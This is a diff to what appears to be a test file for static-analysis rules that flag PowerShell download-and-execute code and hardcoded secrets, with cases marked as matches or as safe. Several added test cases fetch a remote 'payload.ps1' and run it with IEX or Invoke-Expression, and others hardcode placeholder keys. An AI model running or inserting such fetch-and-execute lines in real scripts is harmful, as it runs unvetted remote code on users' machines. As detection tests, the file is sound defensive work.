@@ -35,6 +35,17 @@ function Test-DownloadExecuteIEX {
     IEX (IWR -Uri "https://example.com/payload.ps1")
 }
 
+function Test-DownloadExecuteIrmIEX {
+    # ruleid: powershell-download-execute
+    IEX (irm "https://example.com/payload.ps1")
+}
+
+function Test-DownloadExecuteIrmVar {
+    # ruleid: powershell-download-execute
+    $script = irm "https://example.com/payload.ps1"
+    Invoke-Expression $script
+}
+
 function Test-DownloadExecuteOK {
     # ok: powershell-download-execute
     $result = Invoke-WebRequest -Uri "https://example.com/data.json" -UseBasicParsing
@@ -70,6 +81,18 @@ function Test-HardcodedSecret {
     return $Secret
 }
 
+function Test-HardcodedAccessKey {
+    # ruleid: powershell-hardcoded-secret
+    $AccessKey = "AKIAIOSFODNN7EXAMPLE"
+    return $AccessKey
+}
+
+function Test-HardcodedClientSecret {
+    # ruleid: powershell-hardcoded-secret
+    $ClientSecret = "s3cr3t-client-value"
+    return $ClientSecret
+}
+
 function Test-EnvVarApiKey {
     # ok: powershell-hardcoded-secret
     $ApiKey = $env:MY_API_KEY
@@ -80,6 +103,18 @@ function Test-EnvVarToken {
     # ok: powershell-hardcoded-secret
     $Token = $env:GITHUB_TOKEN
     return $Token
+}
+
+function Test-EnvVarAccessKey {
+    # ok: powershell-hardcoded-secret
+    $AccessKey = $env:AWS_ACCESS_KEY_ID
+    return $AccessKey
+}
+
+function Test-EnvVarClientSecret {
+    # ok: powershell-hardcoded-secret
+    $ClientSecret = $env:AZURE_CLIENT_SECRET
+    return $ClientSecret
 }
 
 # =============================================================================
